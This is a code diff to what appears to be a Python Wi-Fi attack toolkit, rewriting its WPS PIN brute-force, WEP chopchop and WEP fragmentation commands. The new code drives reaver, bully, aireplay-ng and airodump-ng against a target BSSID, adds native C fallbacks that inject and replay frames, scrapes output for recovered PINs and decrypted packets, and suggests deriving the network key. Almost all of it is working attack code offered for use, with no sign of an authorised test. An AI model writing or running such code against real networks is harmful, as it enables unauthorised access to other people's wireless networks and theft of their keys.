@@ -2789,54 +2789,211 @@ while True: s.send(pkt); time.sleep(2)
     # ── WPS brute-force ──────────────────────────────────────────
 
     def do_wps_bruteforce(self, iface: str, bssid: str, **kwargs):
-        UI.print_info(f"WPS brute-force on {iface} → {bssid}")
+        """WPS PIN brute-force with a live rotating theme. Prefers reaver/bully
+        and falls back to the C-native WPS PIN generator when neither is found."""
+        from . import themes as TH
+        iface = iface or self._default_iface()
+        bssid = self._clean_bssid(bssid)
+        timeout = int(kwargs.get("timeout") or 0)
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 8.0)
+        channel = int(kwargs.get("channel") or 0)
+
+        TH.phase_banner("deauth", f"WPS brute  iface={iface}  bssid={bssid}  timeout={timeout or 'unlimited'}s")
+
+        reaver = shutil.which("reaver")
+        bully = shutil.which("bully")
+        cmd = None
+        engine = ""
+        if reaver:
+            cmd = [reaver, "-i", iface, "-b", bssid, "-vv", "-K", "1"]
+            if timeout:
+                cmd.extend(["-t", str(timeout)])
+            engine = "reaver"
+        elif bully:
+            cmd = [bully, iface, "-b", bssid, "-v", "3"]
+            engine = "bully"
+
+        if not cmd:
+            UI.print_warning("No reaver/bully found — using C-native WPS PIN generator.")
+            self.do_wps_pin(bssid)
+            return
+
+        state = {
+            "bssid": bssid, "station": "WPS", "frames": 0, "pps": 0.0,
+            "elapsed": 0.0, "errors": 0, "channel": channel or None,
+            "reason": "pin", "band": "2.4",
+        }
+        started = time.time()
+        found_pin = ""
+        pin_pct = 0.0
+        proc = None
         try:
-            reaver = shutil.which("reaver")
-            if reaver:
-                cmd = [reaver, "-i", iface, "-b", bssid, "-vv", "-K", "1"]
-                timeout = kwargs.get("timeout", 0)
-                if timeout:
-                    cmd.extend(["-t", str(timeout)])
-                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                jid = self.jobs.start(f"wps-brute-{bssid[:8]}", proc)
-                UI.print_success(f"WPS brute started (job {jid})")
-                return
-            bully = shutil.which("bully")
-            if bully:
-                cmd = [bully, iface, "-b", bssid, "-v", "3"]
-                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                jid = self.jobs.start(f"wps-brute-{bssid[:8]}", proc)
-                UI.print_success(f"WPS brute started (job {jid})")
-                return
-            UI.print_error("Neither reaver nor bully found. Install: apt install reaver bully")
-        except Exception as e:
-            UI.print_error(f"WPS brute failed: {e}")
+            proc = self.bridge._popen(cmd)
+            with TH.LiveOrchestra("deauth", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                while proc.poll() is None:
+                    line = None
+                    try:
+                        if proc.stdout:
+                            line = proc.stdout.readline()
+                    except Exception:
+                        line = None
+                    t = time.time() - started
+                    state["elapsed"] = t
+                    if line:
+                        txt = line.strip()
+                        if txt:
+                            m = re.search(r"(?:WPS PIN|pin)\s*[:=]\s*['\"]?(\d{4,8})", txt, re.I)
+                            if m:
+                                found_pin = m.group(1)
+                            m = re.search(r"(\d+\.?\d*)%\s*(?:complete|done|progress)", txt, re.I)
+                            if m:
+                                try:
+                                    pin_pct = float(m.group(1))
+                                except ValueError:
+                                    pass
+                            state["frames"] = int(pin_pct)
+                            state["reason"] = f"pin@{pin_pct:.1f}%" if pin_pct else "pin"
+                    lo.refresh()
+                    if found_pin:
+                        proc.terminate()
+                        break
+                try:
+                    proc.wait(timeout=2)
+                except Exception:
+                    try:
+                        proc.terminate()
+                    except Exception:
+                        pass
+        except KeyboardInterrupt:
+            if proc:
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+            UI.print_warning("WPS brute stopped by operator.")
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+
+        TH.summary_panel(
+            [
+                ("engine", engine),
+                ("target", bssid),
+                ("elapsed", f"{time.time() - started:.1f}s"),
+                ("status", f"PIN {found_pin}" if found_pin else f"progress {pin_pct:.1f}%"),
+            ],
+            title="WPS BRUTE COMPLETE",
+            accent="bright_green" if found_pin else "bright_yellow",
+        )
+        if found_pin:
+            UI.print_success(f"WPS PIN recovered: {found_pin}  →  run `wps pin {bssid} --all` for PSK")
 
     # ── WEP chopchop attack ──────────────────────────────────────
 
     def do_wep_chopchop(self, iface: str, bssid: str, **kwargs):
-        output = kwargs.get("output", f"wep_chop_{bssid[:8].replace(':','')}.cap")
-        UI.print_info(f"WEP chopchop on {iface} → {bssid}")
+        """WEP chopchop attack. aireplay-ng primary, C-FFI inject_chopchop native
+        fallback that actually splices and replays decrypted ARP frames."""
+        from . import themes as TH
+        iface = iface or self._default_iface()
+        bssid = self._clean_bssid(bssid)
+        output = kwargs.get("output", f"wep_chop_{bssid.replace(':','')}.cap")
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 6.0)
+        TH.phase_banner("deauth", f"WEP chopchop  iface={iface}  target={bssid}")
+
+        aireplay = shutil.which("aireplay-ng")
+        state = {
+            "bssid": bssid, "station": "chop", "frames": 0, "pps": 0.0,
+            "elapsed": 0.0, "errors": 0, "channel": kwargs.get("channel"),
+            "reason": "chop", "band": "2.4",
+        }
+        started = time.time()
+        proc = None
+        engine = ""
         try:
-            aireplay = shutil.which("aireplay-ng")
-            if not aireplay:
-                UI.print_error("aireplay-ng not found. Install aircrack-ng.")
-                return
-            airodump = shutil.which("airodump-ng")
-            if airodump:
-                prefix = output.replace(".cap", "")
-                dump = subprocess.Popen(
-                    [airodump, "-c", "1", "--bssid", bssid, "-w", prefix, "--output-format", "pcap", iface],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-            chop = subprocess.Popen(
-                [aireplay, "--chopchop", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-            )
-            jid = self.jobs.start(f"wep-chop-{bssid[:8]}", chop)
-            UI.print_success(f"Chopchop started (job {jid}), output: {output}")
-        except Exception as e:
-            UI.print_error(f"WEP chopchop failed: {e}")
+            if aireplay:
+                airodump = shutil.which("airodump-ng")
+                if airodump:
+                    prefix = output.rsplit(".", 1)[0]
+                    self.bridge._popen([
+                        airodump, "-c", str(kwargs.get("channel") or 1),
+                        "--bssid", bssid, "-w", prefix,
+                        "--output-format", "pcap", iface,
+                    ])
+                cmd = [aireplay, "--chopchop", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface]
+                proc = self.bridge._popen(cmd)
+                engine = "aireplay-ng"
+            else:
+                lib = self.bridge.c_lib()
+                if lib is None:
+                    UI.print_error("Neither aireplay-ng nor C engine available. Install aircrack-ng or run 'build c'.")
+                    return
+                engine = "c-ffi"
+                state["reason"] = "native chopchop"
+
+            with TH.LiveOrchestra("deauth", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                if proc is not None:
+                    while proc.poll() is None:
+                        line = None
+                        try:
+                            if proc.stdout:
+                                line = proc.stdout.readline()
+                        except Exception:
+                            line = None
+                        t = time.time() - started
+                        state["elapsed"] = t
+                        if line:
+                            txt = line.strip()
+                            if txt:
+                                m = re.search(r"(\d+)\s*(?:packets|frames)\s*sent", txt, re.I)
+                                if m:
+                                    state["frames"] = int(m.group(1))
+                                m = re.search(r"(\d+)%\s*(?:complete|done)", txt)
+                                if m:
+                                    state["reason"] = f"chop@{m.group(1)}%"
+                                state["pps"] = state["frames"] / max(0.001, t)
+                        lo.refresh()
+                else:
+                    # C-FFI chopchop: loop until we get a decrypted packet back
+                    # or Ctrl-C. C function returns bytes_replayed.
+                    max_attempts = int(kwargs.get("attempts") or 200)
+                    for attempt in range(max_attempts):
+                        try:
+                            n, pkt = self.bridge.c_chopchop(iface, bssid, "")
+                        except EngineBuildError:
+                            n, pkt = 0, b""
+                        if n > 0 and pkt:
+                            state["frames"] = n
+                            state["reason"] = f"got {n}B decrypted packet"
+                            with open(output, "wb") as fh:
+                                fh.write(pkt)
+                            UI.print_success(f"Chopchop recovered {n} bytes → {output}")
+                            break
+                        state["errors"] += 0 if n >= 0 else 1
+                        state["elapsed"] = time.time() - started
+                        state["pps"] = state["frames"] / max(0.001, state["elapsed"])
+                        lo.refresh()
+                        time.sleep(0.4)
+        except KeyboardInterrupt:
+            if proc:
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+            UI.print_warning("WEP chopchop stopped by operator.")
+
+        TH.summary_panel(
+            [
+                ("engine", engine),
+                ("target", bssid),
+                ("bytes recovered", f"{state['frames']:,}"),
+                ("elapsed", f"{time.time() - started:.1f}s"),
+            ],
+            title="WEP CHOPCHOP COMPLETE",
+            accent="bright_green" if state["frames"] else "bright_yellow",
+        )
 
     # ── WEP Fragment (GUI alias: do_wep_fragment → do_wep_frag) ──
 
@@ -2847,28 +3004,107 @@ while True: s.send(pkt); time.sleep(2)
     # ── WEP fragmentation attack ─────────────────────────────────
 
     def do_wep_frag(self, iface: str, bssid: str, **kwargs):
-        output = kwargs.get("output", f"wep_frag_{bssid[:8].replace(':','')}.cap")
-        UI.print_info(f"WEP fragmentation on {iface} → {bssid}")
+        """WEP fragmentation attack. aireplay-ng primary, C-FFI inject_frag
+        native fallback that builds and replays fragmented ARP frames."""
+        from . import themes as TH
+        iface = iface or self._default_iface()
+        bssid = self._clean_bssid(bssid)
+        output = kwargs.get("output", f"wep_frag_{bssid.replace(':','')}.cap")
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 6.0)
+        frag_size = int(kwargs.get("frag_size") or 64)
+        TH.phase_banner("deauth", f"WEP fragmentation  iface={iface}  target={bssid}")
+
+        aireplay = shutil.which("aireplay-ng")
+        state = {
+            "bssid": bssid, "station": "frag", "frames": 0, "pps": 0.0,
+            "elapsed": 0.0, "errors": 0, "channel": kwargs.get("channel"),
+            "reason": "frag", "band": "2.4",
+        }
+        started = time.time()
+        proc = None
+        engine = ""
         try:
-            aireplay = shutil.which("aireplay-ng")
-            if not aireplay:
-                UI.print_error("aireplay-ng not found. Install aircrack-ng.")
-                return
-            airodump = shutil.which("airodump-ng")
-            if airodump:
-                prefix = output.replace(".cap", "")
-                dump = subprocess.Popen(
-                    [airodump, "-c", "1", "--bssid", bssid, "-w", prefix, "--output-format", "pcap", iface],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            if aireplay:
+                airodump = shutil.which("airodump-ng")
+                if airodump:
+                    prefix = output.rsplit(".", 1)[0]
+                    self.bridge._popen([
+                        airodump, "-c", str(kwargs.get("channel") or 1),
+                        "--bssid", bssid, "-w", prefix,
+                        "--output-format", "pcap", iface,
+                    ])
+                proc = self.bridge._popen(
+                    [aireplay, "--fragment", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface]
                 )
-            frag = subprocess.Popen(
-                [aireplay, "--fragment", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-            )
-            jid = self.jobs.start(f"wep-frag-{bssid[:8]}", frag)
-            UI.print_success(f"Fragmentation started (job {jid}), output: {output}")
-        except Exception as e:
-            UI.print_error(f"WEP frag failed: {e}")
+                engine = "aireplay-ng"
+            else:
+                lib = self.bridge.c_lib()
+                if lib is None:
+                    UI.print_error("Neither aireplay-ng nor C engine available. Install aircrack-ng or run 'build c'.")
+                    return
+                engine = "c-ffi"
+
+            with TH.LiveOrchestra("deauth", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                if proc is not None:
+                    while proc.poll() is None:
+                        line = None
+                        try:
+                            if proc.stdout:
+                                line = proc.stdout.readline()
+                        except Exception:
+                            line = None
+                        t = time.time() - started
+                        state["elapsed"] = t
+                        if line:
+                            txt = line.strip()
+                            if txt:
+                                m = re.search(r"(\d+)\s*(?:packets|frames)\s*sent", txt, re.I)
+                                if m:
+                                    state["frames"] = int(m.group(1))
+                                m = re.search(r"(\d+)%\s*(?:complete|done)", txt)
+                                if m:
+                                    state["reason"] = f"frag@{m.group(1)}%"
+                                state["pps"] = state["frames"] / max(0.001, t)
+                        lo.refresh()
+                else:
+                    # C-FFI frag: loop, every successful call replays a
+                    # fragmented frame toward the AP and returns 1.
+                    max_attempts = int(kwargs.get("attempts") or 500)
+                    for attempt in range(max_attempts):
+                        try:
+                            n = self.bridge.c_frag_attack(iface, bssid, "", frag_size)
+                        except EngineBuildError:
+                            n = 0
+                        if n > 0:
+                            state["frames"] += n
+                            state["pps"] = state["frames"] / max(0.001, time.time() - started)
+                            if state["frames"] == 1:
+                                UI.print_success("Fragmentation established — replaying ARP.")
+                        else:
+                            state["errors"] += 1
+                        state["elapsed"] = time.time() - started
+                        lo.refresh()
+                        time.sleep(0.3)
+        except KeyboardInterrupt:
+            if proc:
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+            UI.print_warning("WEP fragmentation stopped by operator.")
+
+        TH.summary_panel(
+            [
+                ("engine", engine),
+                ("target", bssid),
+                ("frames replayed", f"{state['frames']:,}"),
+                ("elapsed", f"{time.time() - started:.1f}s"),
+            ],
+            title="WEP FRAGMENTATION COMPLETE",
+            accent="bright_green" if state["frames"] else "bright_yellow",
+        )
 
     # ── Multi-SSID beacon flood ──────────────────────────────────
 
